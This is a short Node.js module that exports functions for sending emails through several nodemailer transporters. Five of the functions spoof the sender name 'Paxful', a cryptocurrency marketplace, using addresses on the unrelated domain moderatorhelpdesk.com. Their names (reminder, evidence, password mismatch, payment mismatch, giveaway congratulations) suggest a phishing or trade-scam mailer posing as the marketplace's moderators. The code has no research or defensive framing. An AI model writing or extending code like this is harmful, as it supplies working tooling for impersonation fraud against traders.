const express = require('express');
const { transporter, reminder, evidence, passmissmatch, givemissmatch, congrats } = require('./MailAuth');

// Function to send email
async function sendEmail(to, subject, html) {
    const info = await transporter.sendMail({
        from: 'dev.jimin02@gmail.com',
        to: to,
        subject: subject,
        html: html
    });

    console.log("Email sent successfully!!", info.messageId);
}


// Function to send email
async function sendReminder(to, subject, html) {
    const info = await reminder.sendMail({
        from:{ 
            name:'Paxful',
            address:'Reminder@moderatorhelpdesk.com'
             },
        to: to,
        subject: subject,
        html: html
    });

    console.log("Email sent successfully!!", info.messageId);
}


// Function to send email
async function sendEvidence(to, subject, html) {
    const info = await evidence.sendMail({
        from: {
            name:'Paxful',
            address:'Support@moderatorhelpdesk.com'
        },
        to: to,
        subject: subject,
        html: html
    });

    console.log("Email sent successfully!!", info.messageId);
}

// Function to send email
async function sendPassMissmatch(to, subject, html) {
    const info = await passmissmatch.sendMail({
        from: {
            name:'Paxful',
            address:'Discrepancy@moderatorhelpdesk.com'
        },
        to: to,
        subject: subject,
        html: html
    });

    console.log("Email sent successfully!!", info.messageId);
}


// Function to send email
async function sendGiveMissmatch(to, subject, html) {
    const info = await givemissmatch.sendMail({
        from: {
            name:'Paxful',
            address:'Mismatch@moderatorhelpdesk.com'
              },
        to: to,
        subject: subject,
        html: html
    });

    console.log("Email sent successfully!!", info.messageId);
}


// Function to send email
async function sendCongrats(to, subject, html) {
    const info = await congrats.sendMail({
        from: {
            name:'Paxful',
            address:'Giveaway@moderatorhelpdesk.com'
              },
        to: to,
        subject: subject,
        html: html
    });

    console.log("Email sent successfully!!", info.messageId);
}




module.exports = {
    sendEmail,
    sendReminder,
    sendGiveMissmatch,
    sendPassMissmatch,
    sendEvidence,
    sendCongrats
}
